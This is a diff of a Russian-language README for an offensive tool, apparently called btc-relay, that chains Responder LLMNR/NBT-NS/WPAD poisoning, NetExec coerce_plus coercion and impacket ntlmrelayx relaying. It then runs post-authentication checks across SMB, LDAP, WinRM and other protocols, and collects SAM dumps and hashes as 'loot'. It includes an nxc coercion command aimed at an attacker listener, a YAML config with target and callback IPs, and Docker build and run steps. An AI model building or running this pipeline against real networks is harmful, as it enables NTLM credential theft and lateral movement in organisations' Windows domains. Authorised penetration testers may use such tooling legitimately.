@@ -62,7 +62,7 @@
 
 ### 2.1. Оркестратор
 
-Написан на Python 3.11+, управляется через CLI (`btc-relay`). Основные задачи:
+Написан на Python 3.11+, управляется через CLI (`btc-relay-rspndr`). Основные задачи:
 
 1. **Чтение конфигурации** — YAML-файл валируется Pydantic-моделями.
 2. **Управление Docker-контейнерами** — через `docker-py` SDK.
@@ -121,11 +121,13 @@ nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
 ## 3. Поток данных (Data Flow)
 
 ```
-Phase 1: Coercion
-─────────────────
-Orchestrator ──► nxc Docker (coerce module) ──► Target Machine
-                                                     │
-                                                     ▼
+Phase 1: Passive Poisoning + Active Coercion
+────────────────────────────────────────────
+Responder ──► LLMNR/NBT-NS/WPAD poisoning ──► Target Machine
+                                                    │
+Orchestrator ──► nxc Docker (coerce_plus) ──► Target Machine
+                                                    │
+                                                    ▼
 Phase 2: Capture                               SMB/HTTP auth
 ─────────────────                                    │
 Target Machine ──► ntlmrelayx (listener) ◄───────────┘
@@ -159,12 +161,13 @@ ntlmrelayx log ◄── Orchestrator parses success
 
 ### Пошагово
 
-1. **Orchestrator** читает `config.yaml` и стартует `ntlmrelayx` в detached-контейнере.
-2. **Coerce Pipeline** в несколько потоков обходит `coerce.targets`, запуская nxc coerce-модули. Жертвы начинают аутентифицироваться на listener.
-3. **ntlmrelayx** перехватывает NTLM (Type 1/2/3), релеит их к `targets_relay.txt`. Логи пишутся в `./logs/ntlmrelayx.log`.
-4. **Log Parser** (фоновый поток) обнаруживает успешный relay, создаёт/обновляет сессию в `SessionRegistry` со статусом `RELAY_SUCCESS`.
-5. **Post-Auth Pipeline** (отдельный ThreadPool) для каждой такой сессии запускает настроенные nxc проверки по всем протоколам (smb, ldap, winrm, mssql, ssh, rdp).
-6. **Результаты** всех этапов (coerce stdout, relay metadata, post-auth parsed output) дописываются в `sessions.jsonl`.
+1. **Orchestrator** читает `config.yaml` и стартует `Responder` (passive poisoning) и `ntlmrelayx` (listener + relay) в detached-контейнерах.
+2. **Responder** отравляет LLMNR/NBT-NS/mDNS/WPAD запросы в сегменте, перенаправляя жертв на IP атакующего.
+3. **Coerce Pipeline** в несколько потоков обходит `coerce.targets`, запуская nxc `coerce_plus`. Жертвы начинают аутентифицироваться на listener.
+4. **ntlmrelayx** перехватывает NTLM (Type 1/2/3), релеит их к `targets_relay.txt`. Логи пишутся в `./logs/ntlmrelayx.log`.
+5. **Log Parser** (фоновый поток) обнаруживает успешный relay, создаёт/обновляет сессию в `SessionRegistry` со статусом `RELAY_SUCCESS`.
+6. **Post-Auth Pipeline** (отдельный ThreadPool) для каждой такой сессии запускает настроенные nxc проверки по всем протоколам (smb, ldap, winrm, mssql, ssh, rdp).
+7. **Результаты** всех этапов (Responder poison events, coerce stdout, relay metadata, post-auth parsed output) дописываются в `sessions.jsonl`.
 
 ---
 
@@ -216,6 +219,7 @@ RELAYING
 |------------|-------------------|------------|
 | `./loot` | `/loot` | SAM dumps, hashes, SOCKS-данные от ntlmrelayx |
 | `./logs` | `/logs` | Логи ntlmrelayx для tail'инга оркестратором |
+| `./responder` | `/opt/responder` | Responder.conf, Responder.db, poisoner логи |
 | `./` (ro) | `/workspace` | Таргет-файлы, вордлисты для nxc |
 
 ---
@@ -225,7 +229,7 @@ RELAYING
 Конфигурация задаётся в YAML-файле (по умолчанию `config.yaml`).
 
 ```yaml
-project_name: "btc-relay-module-nxc-impckt"
+project_name: "btc-module-relay-nxc-impckt-rspndr"
 log_level: "INFO"
 output_jsonl: "sessions.jsonl"
 
@@ -233,9 +237,18 @@ output_jsonl: "sessions.jsonl"
 docker:
   impacket_image: "btc-relay/impacket:latest"
   netexec_image: "btc-relay/netexec:latest"
+  responder_image: "btc-relay/responder:latest"
   network_mode: "host"
   loot_dir: "./loot"
   logs_dir: "./logs"
+  responder_config_dir: "./responder"
+
+# Passive poisoning via Responder
+responder:
+  enabled: true
+  interface: "eth0"
+  wpad: true
+  dns: true
 
 # Relay engine: impacket ntlmrelayx
 ntlmrelayx:
@@ -253,10 +266,11 @@ ntlmrelayx:
 coerce:
   enabled: true
   methods:
-    - "petitpotam"
+    - "coerce_plus"
   targets:
     - "192.168.1.10"
   callback_host: "192.168.1.5"   # IP хоста с listener'ом
+  always: false
   delay_between: 5.0
   workers: 4
 
@@ -304,7 +318,7 @@ post_auth:
 ### Установка
 
 ```bash
-cd btc-relay-module-nxc-impckt
+cd btc-module-relay-nxc-impckt-rspndr
 poetry install
 ```
 
@@ -313,6 +327,7 @@ poetry install
 ```bash
 docker build -t btc-relay/impacket:latest docker/impacket
 docker build -t btc-relay/netexec:latest docker/netexec
+docker build -t btc-relay/responder:latest docker/responder
 ```
 
 ### Запуск
@@ -333,11 +348,11 @@ poetry run btc-relay start -c config.yaml
 ### CLI
 
 ```bash
-poetry run btc-relay --help
+poetry run btc-relay-rspndr --help
 # Commands:
-#   start   Запуск оркестратора (coerce + relay + post-auth)
-#   status  Проверка статуса ntlmrelayx контейнера
-#   stop    Принудительная остановка ntlmrelayx контейнера
+#   start   Запуск оркестратора (responder + coerce + relay + post-auth)
+#   status  Проверка статуса responder и ntlmrelayx контейнеров
+#   stop    Принудительная остановка всех контейнеров
 ```
 
 ---
